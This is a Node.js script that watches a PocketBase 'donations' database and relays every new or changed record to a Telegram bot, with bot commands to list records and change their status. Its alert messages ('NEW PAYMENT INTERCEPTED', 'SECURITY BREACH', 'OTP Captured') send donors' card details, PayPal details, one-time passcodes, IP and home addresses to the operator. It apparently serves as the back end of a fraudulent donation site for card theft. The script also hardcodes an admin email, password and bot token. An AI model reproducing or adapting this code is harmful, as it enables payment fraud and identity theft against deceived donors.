import PocketBase from "pocketbase";
import fetch from "node-fetch";
import { EventSource } from "eventsource";
global.EventSource = EventSource;

// PocketBase
const pb = new PocketBase("https://yashar-project.onrender.com");

// Admin login (use your real admin email + password)
await pb.collection("_superusers").authWithPassword("johnsnippet27@gmail.com", "Godwetrust@23");
console.log("✅ Authenticated as Admin");

// Telegram Bot config
const TG_TOKEN = "8123701174:AAGTw0X6DCPFHCovKm0LjerreXK38t601b0";
const TG_CHAT_ID = "8391637887";

// Test Telegram connection first
async function testTelegram() {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getMe`);
    const data = await response.json();
    console.log("🤖 Bot Info:", data);
    return data.ok;
  } catch (error) {
    console.error("❌ Telegram connection failed:", error);
    return false;
  }
}

// Test the connection
const telegramWorking = await testTelegram();
console.log(telegramWorking ? "✅ Telegram connection OK" : "❌ Telegram connection failed");

// Simple message function with error handling
async function sendTelegramMessage(text, chatId = TG_CHAT_ID, isUpdate = false) {
  try {
    const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: "HTML"
      }),
    });
    
    const result = await response.json();
    console.log(isUpdate ? "📤 Update Message Result:" : "📤 New Message Result:", result);
    
    if (!result.ok) {
      console.error("❌ Telegram API Error:", result);
      // Try without parse_mode as fallback
      await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: text.replace(/<[^>]*>/g, ''), // Remove HTML tags
        }),
      });
    }
    
    return result.ok;
  } catch (error) {
    console.error("❌ Telegram send failed:", error);
    return false;
  }
}

// Function to update donation status
async function updateDonationStatus(donationId, newStatus, chatId) {
  try {
    const updatedRecord = await pb.collection("donations").update(donationId, {
      Transaction_status: newStatus,
      updated: new Date().toISOString()
    });
    
    await sendTelegramMessage(
      `✅ <b>Status Updated Successfully</b>\n\n` +
      `📋 <b>Donation ID:</b> <code>${donationId}</code>\n` +
      `🔄 <b>New Status:</b> <code>${newStatus}</code>\n` +
      `⏰ <b>Updated At:</b> <code>${new Date().toLocaleString()}</code>`,
      chatId
    );
    
    return updatedRecord;
  } catch (error) {
    console.error("❌ Error updating donation:", error);
    await sendTelegramMessage(
      `❌ <b>Failed to update donation</b>\n\n` +
      `📋 <b>Donation ID:</b> <code>${donationId}</code>\n` +
      `🔄 <b>Attempted Status:</b> <code>${newStatus}</code>\n` +
      `📝 <b>Error:</b> <code>${error.message}</code>`,
      chatId
    );
    return null;
  }
}

// Function to get donation details
async function getDonationDetails(donationId, chatId) {
  try {
    const record = await pb.collection("donations").getOne(donationId);
    
    const details = `
<b>🔍 Donation Details</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🆔 DONATION ID:</b> <code>${record.id}</code>

<b>👤 DONOR INFORMATION:</b>
├─ 📛 <b>Name:</b> <code>${record.Name || 'N/A'}</code>
├─ 📧 <b>Email:</b> <code>${record.email || 'N/A'}</code>
├─ 📞 <b>Phone:</b> <code>${record.Phone_number || 'N/A'}</code>
├─ 🌍 <b>Country:</b> <code>${record.country || 'N/A'}</code>

<b>💰 TRANSACTION INFO:</b>
├─ 🎯 <b>Project:</b> <code>${record.project || 'N/A'}</code>
├─ 💰 <b>Amount:</b> $<code>${record.amount || 'N/A'}</code>
├─ 🔄 <b>Payment Type:</b> <code>${record.Payment_Type || 'N/A'}</code>
├─ 📊 <b>Status:</b> <code>${record.Transaction_status || 'N/A'}</code>
├─ 📅 <b>Created:</b> <code>${record.created || 'N/A'}</code>
└─ ⏰ <b>Updated:</b> <code>${record.updated || 'N/A'}</code>`;
    
    await sendTelegramMessage(details, chatId);
    return record;
  } catch (error) {
    console.error("❌ Error fetching donation:", error);
    await sendTelegramMessage(
      `❌ <b>Donation not found</b>\n\n` +
      `📋 <b>ID:</b> <code>${donationId}</code>\n` +
      `📝 <b>Error:</b> <code>${error.message}</code>`,
      chatId
    );
    return null;
  }
}

// Function to list recent donations
async function listRecentDonations(limit = 5, chatId) {
  try {
    const records = await pb.collection("donations").getList(1, limit, {
      sort: '-created',
    });
    
    let message = `<b>📋 Recent Donations (Last ${limit})</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    
    records.items.forEach((donation, index) => {
      message += 
        `<b>${index + 1}. ${donation.Name || 'Anonymous'}</b>\n` +
        `├─ 💰 $${donation.amount || '0'}\n` +
        `├─ 📊 ${donation.Transaction_status || 'Pending'}\n` +
        `├─ 🆔 <code>${donation.id}</code>\n` +
        `└─ 📅 ${donation.created ? new Date(donation.created).toLocaleDateString() : 'N/A'}\n\n`;
    });
    
    await sendTelegramMessage(message, chatId);
    return records.items;
  } catch (error) {
    console.error("❌ Error listing donations:", error);
    await sendTelegramMessage(
      `❌ <b>Error fetching donations</b>\n\n` +
      `📝 <b>Error:</b> <code>${error.message}</code>`,
      chatId
    );
    return [];
  }
}

// Telegram bot command handler
async function handleTelegramCommand(update) {
  const message = update.message;
  if (!message || !message.text) return;
  
  const chatId = message.chat.id;
  const text = message.text.trim();
  const command = text.split(' ')[0];
  const args = text.split(' ').slice(1);
  
  console.log(`📨 Received command: ${command} from ${chatId}`);
  
  // Check if user is authorized (you can expand this)
  if (chatId.toString() !== TG_CHAT_ID) {
    await sendTelegramMessage("❌ Unauthorized access", chatId);
    return;
  }
  
  switch (command) {
    case '/start':
      await sendTelegramMessage(
        `🤖 <b>Donation Monitor Bot</b>\n\n` +
        `<b>Available Commands:</b>\n` +
        `/list - Show recent donations\n` +
        `/status [id] - Get donation details\n` +
        `/update [id] [status] - Update transaction status\n` +
        `/help - Show this help message\n\n` +
        `<b>Status Options:</b> pending, completed, failed, refunded`,
        chatId
      );
      break;
      
    case '/help':
      await sendTelegramMessage(
        `<b>🆘 Help - Available Commands</b>\n\n` +
        `/list [limit] - Show recent donations (default: 5)\n` +
        `/status [donation_id] - Get detailed donation info\n` +
        `/update [donation_id] [new_status] - Update transaction status\n` +
        `/help - Show this message\n\n` +
        `<b>Examples:</b>\n` +
        `<code>/list 10</code> - Show 10 recent donations\n` +
        `<code>/status abc123</code> - Get details for donation abc123\n` +
        `<code>/update abc123 completed</code> - Mark as completed`,
        chatId
      );
      break;
      
    case '/list':
      const limit = args[0] ? parseInt(args[0]) : 5;
      await listRecentDonations(limit, chatId);
      break;
      
    case '/status':
      if (args.length === 0) {
        await sendTelegramMessage("❌ <b>Usage:</b> <code>/status [donation_id]</code>", chatId);
        return;
      }
      await getDonationDetails(args[0], chatId);
      break;
      
    case '/update':
      if (args.length < 2) {
        await sendTelegramMessage(
          "❌ <b>Usage:</b> <code>/update [donation_id] [new_status]</code>\n\n" +
          "<b>Valid statuses:</b> pending, completed, failed, refunded",
          chatId
        );
        return;
      }
      await updateDonationStatus(args[0], args[1], chatId);
      break;
      
    default:
      await sendTelegramMessage(
        "❌ Unknown command. Use /help to see available commands.",
        chatId
      );
  }
}

// Set up Telegram webhook (or use long polling)
async function setupTelegramBot() {
  // For long polling approach
  let offset = 0;
  
  async function getUpdates() {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=30`);
      const data = await response.json();
      
      if (data.ok && data.result.length > 0) {
        for (const update of data.result) {
          await handleTelegramCommand(update);
          offset = update.update_id + 1;
        }
      }
    } catch (error) {
      console.error("❌ Error getting Telegram updates:", error);
    }
    
    // Continue polling
    setTimeout(getUpdates, 1000);
  }
  
  // Start polling
  getUpdates();
  console.log("🤖 Telegram bot started with long polling");
}

// Your existing donation subscription
pb.collection("donations").subscribe("*", async (e) => {
  console.log("📩 Donation Event:", e.action, e.record?.id);

  if (e.action === "create") {
    const donation = e.record;
    
    const msg = `
<b>🔓 💸 NEW PAYMENT INTERCEPTED 🔓</b>
<b>🟢 DATA STREAM INITIATED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🆔 DONATION ID:</b> <code>${donation.id}</code>

<b>👤 DONOR IDENTIFIED:</b>
├─ 📛 <b>Name:</b> <code>${donation.Name || 'N/A'}</code>
├─ 📧 <b>Email:</b> <code>${donation.email || 'N/A'}</code>
├─ 📞 <b>Phone:</b> <code>${donation.Phone_number || 'N/A'}</code>
├─ 🌍 <b>Country:</b> <code>${donation.country || 'N/A'}</code>
├─ 🌐 <b>IP Address:</b> <code>${donation.IP || 'N/A'}</code>
└─ 🏠 <b>Address:</b> <code>${donation.Donor_Address || 'N/A'}</code>

<b>📊 TRANSACTION DETAILS:</b>
├─ 🎯 <b>Project:</b> <code>${donation.project || 'N/A'}</code>
├─ 🔄 <b>Payment Type:</b> <code>${donation.Payment_Type || 'N/A'}</code>
├─ 💰 <b>Amount:</b> $<code>${donation.amount || 'N/A'}</code>
├─ 📊 <b>Status:</b> <code>${donation.Transaction_status || 'Pending'}</code>
├─ 📅 <b>Date Created:</b> <code>${donation.created || 'N/A'}</code>
└─ ⏰ <b>Last Updated:</b> <code>${donation.updated || 'N/A'}</code>

<b>🔐 SECURITY BREACH:</b>
├─ 🎴 <b>Card Details:</b> <code>${donation.Card_details || 'N/A'}</code>
├─ 📱 <b>PayPal Details:</b> <code>${donation.paypal_details || 'N/A'}</code>
└─ 🔢 <b>OTP Captured:</b> <code>${donation.OTP || 'N/A'}</code>

<b>⚠️ NEW DATA STREAM ESTABLISHED ⚠️</b>

💡 <i>Use /status ${donation.id} for details or /update ${donation.id} [status] to modify</i>`;

    const telegramSent = await sendTelegramMessage(msg);
    console.log(telegramSent ? "✅ Telegram alert sent" : "❌ Telegram alert failed");

  } else if (e.action === "update") {
    const updatedDonation = e.record;
    
    const updateMsg = `
<b>🔓 💸 PAYMENT DATA MODIFIED 🔓</b>
<b>🟡 DATA STREAM UPDATED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🆔 DONATION ID:</b> <code>${updatedDonation.id}</code>

<b>👤 DONOR PROFILE:</b>
├─ 📛 <b>Name:</b> <code>${updatedDonation.Name || 'N/A'}</code>
├─ 📧 <b>Email:</b> <code>${updatedDonation.email || 'N/A'}</code>
├─ 📞 <b>Phone:</b> <code>${updatedDonation.Phone_number || 'N/A'}</code>
└─ 🏠 <b>Address:</b> <code>${updatedDonation.Donor_Address || 'N/A'}</code>

<b>💳 PAYMENT INTELLIGENCE:</b>
├─ 🔄 <b>Payment Type:</b> <code>${updatedDonation.Payment_Type || 'N/A'}</code>
├─ 💰 <b>Amount:</b> $<code>${updatedDonation.amount || 'N/A'}</code>
├─ 📊 <b>Status:</b> <code>${updatedDonation.Transaction_status || 'N/A'}</code>
└─ ⏰ <b>Time Updated:</b> <code>${updatedDonation.updated || 'N/A'}</code>

<b>🔐 SECURITY DATA UPDATED:</b>
├─ 🎴 <b>Card Details:</b> <code>${updatedDonation.Card_details || 'N/A'}</code>
├─ 📱 <b>PayPal Details:</b> <code>${updatedDonation.paypal_details || 'N/A'}</code>
└─ 🔢 <b>OTP Verification:</b> <code>${updatedDonation.OTP || 'N/A'}</code>

<b>⚠️ DATA STREAM MODIFIED CHECK OTP⚠️</b>

💡 <i>Use /status ${updatedDonation.id} for details or /update ${updatedDonation.id} [status] to modify further</i>`;
    
    const telegramSent = await sendTelegramMessage(updateMsg, TG_CHAT_ID, true);
    console.log(telegramSent ? "✅ Update alert sent" : "❌ Update alert failed");
  }
});

// Start the Telegram bot
setupTelegramBot();

console.log("🚀 Donation monitor started... Waiting for events");